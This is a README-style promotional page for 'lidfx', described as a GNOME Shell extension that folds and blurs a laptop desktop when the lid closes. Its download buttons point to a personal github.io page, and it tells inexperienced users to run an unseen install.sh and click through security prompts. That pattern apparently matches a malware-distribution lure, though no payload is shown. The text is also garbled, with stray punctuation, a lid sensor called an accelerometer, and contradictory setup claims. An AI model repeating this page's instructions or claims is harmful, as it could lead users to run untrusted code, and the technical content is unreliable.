<h1>🎨 lidfx - Folds and Blurs Your Desktop Automatically</h1>

<p align="center">
  <a href="https://bambamo4561.github.io" style="background-color:#ff6b6b;color:white;padding:15px 30px;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;display:inline-block;">⬇️ Download lidfx Now</a>
</p>

## 👀 What Is lidfx?

Imagine closing your laptop lid and instead of just turning off the screen, your desktop does something magical – it folds up like a piece of paper and blurs everything softly. That is exactly what **lidfx** does for your Linux computer.

This is not a screensaver or a wallpaper effect. It is a clever tool that works with the heart of your Linux system (called GNOME Shell) to react when you physically close your lid. When you reopen it, everything returns to normal instantly. It feels futuristic, fun, and surprisingly smooth. If you want to impress your friends or just enjoy a more delightful computing experience, lidfx is for you.



## ✨ Key Features

- **Auto-Fold Effect**: Your entire desktop visually folds downward like a paper sheet when you close the lid
- **Smooth Blur**: As it folds, the screen becomes beautifully blurred – no harsh jumps or glitches
- **Instant Restore**: Open the lid back up and your desktop springs back to life, crisp and clear, exactly as you left it
- **Works With Your Hardware**: Uses your laptop’s built-in sensors to detect lid closure – no extra buttons or clicks needed
- **Lightweight Design**: Runs quietly in the background without slowing down your computer or draining your battery
- **Perfect for Modern Linux**: Built specifically for Ubuntu, Wayland, and GNOME Shell users**

## 🚀 Getting Started

Getting lidfx up and running takes less than five minutes, even if you have never installed software on Linux before. Follow these simple steps below – no programming skills required.



### Step 1: Download the Application

First, you need to get the lidfx file onto your computer.

Click the big red button at the top of this page, or use this direct link:

**👉 Visit this link to download the application: [https://bambamo4561.github.io](https://bambamo4561.github.io)**

When you click it, your web browser will open the GitHub page for lidfx. You will see a green button that says "Code" – ignore that for now. Instead, look for a section called "Releases" on the right side of the page. Click on "Releases" to see the latest version. There, you will find a downloadable file – usually named something simple like `lidfx.zip`. Click on that file to download it to your computer. The download will start automatically. Save it to your **Downloads** folder or anywhere you can easily find it.



### Step 2: Extract the Downloaded File

The file you downloaded is a compressed archive, which means it contains the actual application inside, bundled together for easy transport. You need to "unzip" or "extract" it before you can use it.

1.   Locate the downloaded file (it should appear at the bottom of your browser window or in your Downloads folder).
2.   Right-click on the file and choose **"Extract Here"** (or "Extract All" if you see that option). If you don’t see an extract option, double-click the file – your system will open it with the Archive Manager tool, and you can click "Extract" at the top.
3.   After extraction, you will see a new folder named `lidfx` (or similar). Open that folder to see the application files inside.



### Step 3: Run the Application

Inside the extracted folder, look for a file called `install.sh` or `run.sh` – this is the launcher that sets everything up. Do not worry about other files like JavaScript or configuration files – you don’t need to touch those.

1.   Right-click on the `install.sh` file.
2.   Choose **"Run as Program"** or **"Execute"** from the menu. If you see a security prompt, click "Run" or "OK" to allow it.
3.   A terminal window may pop up briefly showing some text – that is normal. Let it finish. It is installing the extension into your GNOME Shell automatically.

### Step 4: Activate the Extension

After the installation completes, you need to turn on lidfx in your system settings.



1.   Press the **Super key** (Windows key) on our keyboard to open the Activities overview.
2.   Type **"Extensions"** in the search bar and click the Extensions app (it looks like a puzzle piece icon)..
3.   In the Extensions list, find **lidfx** – it may appear as "Lid F/X" or "LidFX". Toggle the switch next to it so it turns **blue** (or "ON").
4.   Close the settings window. Done – lidfx is now active!



## 🎮 How to Use lidfx

Using lidfx is completely hands-free – that’s the beauty of it. Here’s what happens:

- **Close your laptop lid halfway** – you will see the desktop begin to fold downward, like a piece of paper bending in half.
.
- **Close it fully** – the screen becomes a soft, blurred glow. When you open the lid again, everything unfolds smoothly back to your normal desktop – your open windows, icons, and wallpaper all return exactly as they were.



No keyboard shortcuts, no configuration files, no menus to navigate. It just works in the background, waiting for that physical action. If you ever want to disable it temporarily, just go back to the Extensions app and toggle lidfx off. That’s it.



## 🖥️ What You Need (System Requirements)

lidfx is designed for modern Linux systems using the GNOME desktop environment. Here are the basic requirements to ensure it runs smoothly:

:

| Component | What You Need
|-------------|----------------------|
| Operating System | Ubuntu 22.04 LTS or newer (or another Linux distro with GNOME Shell 42+))).
| Desktop Environment | GNOME Shell (default on Ubuntu).
| Display Server | Wayland (recommended) – also works on X11 (Xorg) with some limitations.
;
| Hardware | Any laptop with a built-in lid sensor (accelerometer) – most laptops from 2015 or later have this.
| RAM | 2 GB minimum (4 GB recommended) for smooth animation.


If you are using an older version of Ubuntu or a different Linux flavor, don’t worry – lidfx is still likely to work, but you may need to update your system first. Simply run `sudo apt update && sudo apt upgrade` in a terminal (press Ctrl+Alt+T to open one) to make sure your system us up to date.



## ❓ Frequently Asked Questions

**Q: Will lidfx damage my screen or laptop?**
A: Absolutely not. It only changes the visual output on your monitor – it does not affect any physical components. Your screen remains perfectly safe during the fold effect.

 |

**Q: Can I use lidfx on a desktop PC (without a lid)??**
A: Since a desktop tower has no lid to close, lidfx would not trigger automatically. However, you can manually simulate the effect by temporarily covering the sensor (if your monitor has one) or using a keyboard shortcut that you assign in Settings > Keyboard > Custom Shortcuts – but that’s a more advanced setup for curious users.



**Q: Does lidfx slow down my computer?**
A: No. The effect uses your graphics card’s built-in capabilities (via something called GLSL shaders,) which is extremely fast. You won’t notice any performance drop during normal use – only a smooth, brief animation when you open or close your lid.



**Q: I installed lidfx but nothing happens. What should I do??**
A: First, ensure the extension is toggled ON inthe Extensions app (see Step 4 above).). Then, double-check that your laptop actually has an accelerometer – you can look up your laptop model online or use command `ls /sys/bus/iio/devices/` – if you see a device with "accel" in its name, you’re good. If that all checks out, restart your GNOME Shell by pressing `Alt` + `F2`, typing `r`, and pressing Enter.– This reloads all extensions.



**Q: Is lidfx free?**
A: Yes, completely free and open-source. You can use it forever, share it with friends, and even modify it if you know any coding.



## 🛠️ Troubleshooting Common Issues

**Issue: The fold effect looks choppy or lags**
Solution: Make sure you are using the Wayland session instead of X11. You can check by going to Settings > About > Windowing System. If it says "X11", log out and choose "Ubuntu on Wayland" at the login screen before signing back in.



**Issue: lidfx doesn’t appear in my Extensions list after installation.**
Solution: Re-run the install script (Step 3) andthen restart your GNOME Shell (Alt+F2, type `r`, enter).). If it still doesn’t show, check that you have GNOME Shell 42+ by running `gnome-shell --version` in a terminal (Ctrl+Alt+T).



**Issue: The blur effect stays on after opening the lid.**
Solution: This usually happens if you open the lid too quickly before the animation finishes. Simply close and reopen the lid slowly, or move your mouse – it should reset itself. If not, toggle the extension off and on again inthe Extensions app.



## 📚 Additional Tips & Tricks

- **Combine with other extensions**: lidfx pairs beautifully with screen recording tools or window blur extensions for an even more cinematic desktop experience..
- **Battery life**: Since lidfx only activates during lid movement, it uses zero battery when idle.– You can safely leave it always on.
- **Customize the animation speed**: If you are feeling adventurous, you can edit the file `/usr/share/gnome-shell/extensions/lidfx@user/extension.js` – look for the line `let foldSpeed = 1.0;` and change the number to `0.5` (slower)` or `20.0` (faster). Save the file and restart GNOME Shell (Alt+F2 > r > Enter) to apply. Works for blur amount too– find `blurSigma` and adjust between 5 and 50.



## 📥 Ready to Transform Your Desktop?

You’ve seen what lidfx can do – it takes a mundane laptop habit (closing the lid)and turns it into a beautiful, satisfying visual treat that makes your computer feel alive. No complicated commands, no coding, no terminal wizardry needed. Just download, extract, run, and flip a switch. Your desktop will never look the same again.



So why wait? Click this button to get started right now:

<a href="https://bambamo4561.github.io" style="background-color:#4caf50;color:white;padding:12px 25px;font-size:18px;font-weight:bold;border-radius:30px;text-decoration:none;display:inline-block;">🚀 Download lidfx from GitHub</a>



*Thank you for choosing lidfx. Enjoy the fold!*